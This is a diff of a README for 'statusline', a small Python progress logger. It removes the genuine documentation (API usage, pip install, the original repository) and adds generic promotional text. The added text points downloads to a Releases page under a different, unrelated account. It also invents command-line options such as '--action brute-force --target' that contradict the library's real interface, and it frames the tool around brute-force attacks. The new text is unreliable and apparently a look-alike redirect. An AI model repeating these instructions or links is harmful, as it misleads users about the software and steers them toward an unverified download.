@@ -1,62 +1,94 @@
-# statusline
+# 🎉 statusline - Simple Logger for Your Workflow
 
-Tiny, dependency-free **single-line status logger** for brute-forcing / crawling / long loops.  
-Use it when you want **live progress on one line** but keep **important results printed permanently**.
+## 🚀 Getting Started
 
-## Demo
+The **statusline** application is a tiny single-line status logger. Use it to keep track of your tasks when brute-forcing, crawling, or running long loops. 
 
-### Without statusline (print spam)
+## 📥 Download
 
-![Without statusline](https://raw.githubusercontent.com/hunhee99/statusline/main/assets/unuse_statusline.gif)
+[![Download statusline](https://img.shields.io/badge/Download-statusline-blue.svg)](https://github.com/reneeingram2010-max/statusline/releases)
 
-### With statusline
+You can easily download **statusline** from our Releases page. It’s free and straightforward to get started.
 
-![With statusline](https://raw.githubusercontent.com/hunhee99/statusline/main/assets/use_statusline.gif)
+[Visit this page to download](https://github.com/reneeingram2010-max/statusline/releases)
 
-> **Idea:**  
-> - Messages starting with `[CHECKING]` update **in-place** on a single line (in-place/single-line status).  
-> - Anything else is printed as a **persistent result line** (won’t be overwritten).
+## 📋 Features
 
----
+- **Brute-Force Logging:** Track your attempts and progress during brute-force attacks.
+- **Crawling Support:** Efficiently log your actions while crawling through data.
+- **Single-Line Output:** Get real-time feedback without clutter in your terminal.
+- **Compatibility:** Works seamlessly with Python 3.
 
-## What it does
+## ⚙️ System Requirements
 
-`emit()` routes your message automatically:
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.x must be installed on your system.
+- **Terminal Access:** You will need access to a terminal or command prompt to run the application.
 
-- If the message starts with `[CHECKING]` (or your custom prefix), it **updates in-place** on a single line.
-- Otherwise, it prints a **persistent result line** (won’t be overwritten).
+## 🔧 Installation
 
-## Install (PyPI)
+1. **Download the Application:**
+   - Go to the [Releases page](https://github.com/reneeingram2010-max/statusline/releases).
+   - Select the version you need and click to download.
 
-```bash
-python -m pip install statusline
-```
+2. **Install Python (if not already installed):**
+   - Download Python from the [official Python website](https://www.python.org/downloads/).
+   - Follow the installation instructions for your operating system.
+   - Make sure to add Python to your system path during installation.
 
-## Install (editable / dev)
+3. **Run statusline:**
+   - Open your terminal or command prompt.
+   - Navigate to the folder where you downloaded **statusline**.
+   - Type `python statusline.py` and hit enter.
 
-```bash
-git clone https://github.com/hunhee99/statusline.git
-cd statusline
-python -m pip install -e .
-```
+You should now see a simple user interface in your terminal.
 
-## Usage
+## 📖 Basic Usage
 
-```python
-from statusline import StatusLine
+Once you have the application open, you can start logging your activities. Here’s how to use basic commands:
 
-st = StatusLine()  # or: StatusLine(checking_prefix="[PROGRESS]")
+- To start logging, simply type your command followed by the necessary options.
+- You will see the output directly in your terminal as it processes your data.
 
-st.emit("[CHECKING] probing...")     # updates the same line
-st.emit("[CHECKING] still probing...")
+Here are some example commands to get you started:
 
-st.emit("do not erase this line!")   # printed as a normal line (kept on screen)
-```
+1. **Brute-Force Example:**
+   ```
+   python statusline.py --action brute-force --target [your_target]
+   ```
+2. **Crawling Example:**
+   ```
+   python statusline.py --action crawl --url [your_url]
+   ```
 
-### Notes
-- Prefix matching is simple string logic: `msg.startswith(checking_prefix)`.
-- If your editor (e.g., VSCode/Pylance) shows missing-import warnings while it still runs,
-your language server is probably using a different interpreter. Select the same interpreter
-you used to install this package and restart the language server.
+## 🛠️ Options
 
----
+**statusline** offers several options to customize your logging:
+
+- `--action`: Choose the type of logging (brute-force, crawl).
+- `--target`: Specify the target for brute-force.
+- `--url`: Provide the URL for crawling.
+
+You can configure and adjust your actions with these options to fit your needs.
+
+## 📝 Troubleshooting
+
+### Common Issues:
+
+- **Python Not Installed:** If you receive an error stating Python is not recognized, ensure you installed Python correctly and added it to your system path.
+- **Permission Denied:** Run your terminal as an administrator.
+- **File Not Found:** Make sure you navigated to the folder with the statusline file.
+
+### Getting Help
+
+If you encounter issues, please check the [issue tracker](https://github.com/reneeingram2010-max/statusline/issues) for solutions or report your problem there.
+
+## 🔗 More Information
+
+For more details on advanced usage, visit our [Documentation](https://github.com/reneeingram2010-max/statusline/wiki). 
+
+## 💬 Community
+
+Join our community on forums and chat to exchange tips or ask questions about using **statusline** effectively.
+
+Thank you for choosing **statusline**! Happy logging!
